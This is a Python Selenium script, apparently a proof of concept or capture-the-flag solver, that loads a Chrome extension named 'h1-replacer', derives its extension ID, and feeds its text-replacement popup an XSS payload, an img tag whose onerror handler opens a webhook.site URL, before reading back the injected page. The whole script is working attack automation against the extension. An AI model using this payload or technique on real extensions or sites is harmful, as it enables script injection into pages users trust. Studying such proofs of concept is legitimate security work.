import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

from os import path
import hashlib

def gui():
    # getting id of extension [start]
    def get_ext_id():
        abs_path = path.abspath("h1-replacer")
        m = hashlib.sha256()
        m.update(abs_path.encode("utf-8"))
        ext_id = "".join([chr(int(i, base=16) + 97) for i in m.hexdigest()][:32])
        url_path = f"chrome-extension://{ext_id}/popup.html"
        return url_path, abs_path

    url_path, abs_path = get_ext_id()

    options = webdriver.ChromeOptions()
    # prevent chrome browser from closing and define extension
    options.add_experimental_option('detach', True)
    load_ext_arg = "load-extension="+abs_path
    options.add_argument(load_ext_arg)

    options.add_argument("--enable-logging")
    driver = webdriver.Chrome('./chromedriver', options=options)

    # url_path = get_ext_id()

    driver.get(url_path)
    original = driver.current_window_handle

    driver.switch_to.new_window('tab')

    new = driver.current_window_handle

    driver.get('https://www.example.com')

    time.sleep(2)
    driver.get_screenshot_as_file("ss.png")

    driver.switch_to.window(original)

    a = driver.find_element(By.ID,'replacementInput')

    payload = '<img src=x onerror="window.open(`https://webhook.site/addca2be-52c9-4cee-8589-408277a63dda`)">'

    a.send_keys(payload)

    driver.get_screenshot_as_file("ss.png")

    b = driver.find_element(By.ID, 'replaceButton')

    time.sleep(3)

    driver.get_screenshot_as_file("ss.png")

    b.click()
    
    driver.switch_to.window(new)
    time.sleep(1)
    driver.get_screenshot_as_file("ss.png")

    # driver.switch_to.window(original)

    print(driver.page_source)


gui()
